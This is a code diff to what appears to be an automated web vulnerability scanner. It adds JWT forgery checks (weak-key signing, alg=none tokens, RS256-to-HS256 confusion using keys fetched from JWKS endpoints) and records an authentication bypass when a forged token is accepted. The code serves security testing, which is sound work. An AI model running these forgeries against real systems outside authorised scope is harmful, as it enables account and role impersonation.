@@ -2671,29 +2671,87 @@ class AssistSession:
             n += 1
         return n
 
-    def confirm_jwt_forgery(self, url: str, token: str) -> bool:
-        """Prove a recovered JWT key is usable: mint a token from the captured claims and
-        see whether the server accepts it where an unauthenticated request is refused.
+    def _jwt_public_pems(self) -> list:
+        """The target's RSA public key(s), from a JWKS endpoint, as PEM — for the
+        RS256->HS256 confusion forge. In-scope GETs through the governed browser; a public
+        key set is public by definition, so reading it is not itself a finding. Returns []
+        when no JWKS is reachable or no RSA key is present."""
+        from . import jwtscan
+        from .web import WebAction
+        if self.browser is None:
+            return []
+        surface = getattr(self, "surface", None)
+        base = (getattr(surface, "seed", "") or f"http://{self.target}/").rstrip("/")
+        pems, seen = [], set()
+        for path in ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/oauth/jwks",
+                     "/identity/.well-known/jwks.json", "/api/.well-known/jwks.json"):
+            try:
+                _d, r = self.browser.run(
+                    WebAction("request", url=base + path, method="GET"))
+            except Exception:
+                continue
+            if not r or (r.status or 0) != 200:
+                continue
+            try:
+                doc = json.loads(r.body or "")
+            except Exception:
+                continue
+            keys = doc.get("keys") if isinstance(doc, dict) else None
+            for jwk in (keys if isinstance(keys, list) else []):
+                if not isinstance(jwk, dict) or str(jwk.get("kty", "")).upper() != "RSA":
+                    continue
+                for pem in jwtscan.jwk_to_pems(jwk):
+                    if pem not in seen:
+                        seen.add(pem)
+                        pems.append(pem)
+        return pems
 
-        The differential is the proof. Unauthenticated must be REFUSED and the minted
-        token must be ACCEPTED — an endpoint that serves everyone, or refuses everyone,
+    def confirm_jwt_forgery(self, url: str, token: str) -> bool:
+        """Prove a JWT can be FORGED: build a token the server should reject, and see
+        whether it is accepted where an unauthenticated request is refused.
+
+        Three forge techniques, tried in order, each a deterministic OFFLINE construction:
+          1. a recovered WEAK signing key (HMAC brute / source leak) — the original path;
+          2. the `none` ALGORITHM — an unsigned token a header-trusting verifier accepts
+             (crAPI challenge 15);
+          3. RS256->HS256 ALGORITHM CONFUSION — re-sign HS256 using the server's own RSA
+             public key (from its JWKS) as the HMAC secret, which reaches every RS256
+             target the weak-key path could never touch.
+
+        The differential is the proof for all three: unauthenticated must be REFUSED and a
+        forgery must be ACCEPTED — an endpoint that serves everyone, or refuses everyone,
         demonstrates nothing about the signature."""
         from . import jwtscan
-
         from .web import WebAction
         if self.browser is None:
             return False
-        # A key too long or odd to brute-force may sit in plain sight in the source, and
-        # trying it costs one offline signature check. If it does not reproduce the
-        # signature of a token the target actually issued there is no finding — which is
-        # exactly why reading the source cannot, by itself, produce one.
-        from . import sourcemap as _sourcemap
-        extra = tuple(_sourcemap.secrets_to_try(self.source_leads))
-        secret = jwtscan.crack_hmac_secret(token, extra_secrets=extra)
         parsed = jwtscan.decode(token)
-        if not secret or parsed is None:
+        if parsed is None:
             return False
         header, payload, _si, _sig = parsed
+        fresh = {**payload, "exp": int(time.time()) + 3600}
+        from . import sourcemap as _sourcemap
+        extra = tuple(_sourcemap.secrets_to_try(self.source_leads))
+
+        # (technique label, forged token, evidence detail).
+        candidates = []
+        secret = jwtscan.crack_hmac_secret(token, extra_secrets=extra)
+        if secret:
+            candidates.append((
+                "a recovered weak signing key", jwtscan.sign(header, fresh, secret),
+                f"the signing key {secret!r} was recovered offline from a captured token"))
+        candidates.append((
+            "the 'none' algorithm", jwtscan.none_token(header, fresh),
+            "the token was re-encoded with alg=none and an empty signature"))
+        # Only an ASYMMETRIC token can be confused down to HS256, and only then is the
+        # JWKS worth fetching — so a symmetric token (and the out-of-scope guard) never
+        # spends a request on it.
+        if str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
+            for _pem, forged in jwtscan.confusion_tokens(token, self._jwt_public_pems()):
+                candidates.append((
+                    "RS256->HS256 algorithm confusion", forged,
+                    "the token was re-signed HS256 using the server's own RSA public key "
+                    "(fetched from its JWKS) as the HMAC secret"))
 
         def fetch(auth: str | None):
             headers = {"Authorization": auth} if auth else {}
@@ -2701,9 +2759,8 @@ class AssistSession:
                                                headers=headers))
             return (r.status if r else None), ((r.body if r else "") or "")
 
-        # The browser attaches our live session to any request that does not already
-        # carry one, so an "anonymous" baseline taken while logged in is not anonymous
-        # at all — it comes back 200 and the differential silently proves nothing.
+        # The browser attaches our live session to any request that does not already carry
+        # one, so an "anonymous" baseline taken while logged in is not anonymous at all.
         # Suppress the session for the length of the check, then restore it.
         saved_header = getattr(self.browser, "auth_header", "")
         saved_cookies = dict(getattr(self.browser, "_cookies", {}) or {})
@@ -2714,22 +2771,20 @@ class AssistSession:
             anon_status, _anon_body = fetch(None)
             if anon_status == 200:
                 return False      # open to everyone: acceptance proves nothing
-            minted = jwtscan.sign(header,
-                                  {**payload, "exp": int(time.time()) + 3600}, secret)
-            status, body = fetch(f"Bearer {minted}")
+            for label, minted, detail in candidates:
+                status, body = fetch(f"Bearer {minted}")
+                if status == 200 and not self._AUTH_ERROR_RE.search(body[:2000]):
+                    self._record_confirmed(
+                        url, "Authentication bypass via forged JWT", "critical", "",
+                        f"{detail}; the resulting token ({label}) is ACCEPTED (200) where "
+                        f"an unauthenticated request is refused ({anon_status}) — any user "
+                        f"or role can be impersonated", category="api")
+                    return True
         finally:
             self.browser.auth_header = saved_header
             if hasattr(self.browser, "_cookies"):
                 self.browser._cookies = saved_cookies
-        if status != 200 or self._AUTH_ERROR_RE.search(body[:2000]):
-            return False
-        self._record_confirmed(
-            url, "Authentication bypass via forged JWT", "critical", "",
-            f"the signing key {secret!r} was recovered offline from a captured token; a "
-            f"token minted with it is ACCEPTED (200) where an unauthenticated request is "
-            f"refused ({anon_status}) — any user or role can be impersonated",
-            category="api")
-        return True
+        return False
 
     def confirm_bola(self, url_template: str, param: str, id_a: str, id_b: str,
                      token_a: str, token_b: str = "") -> bool:
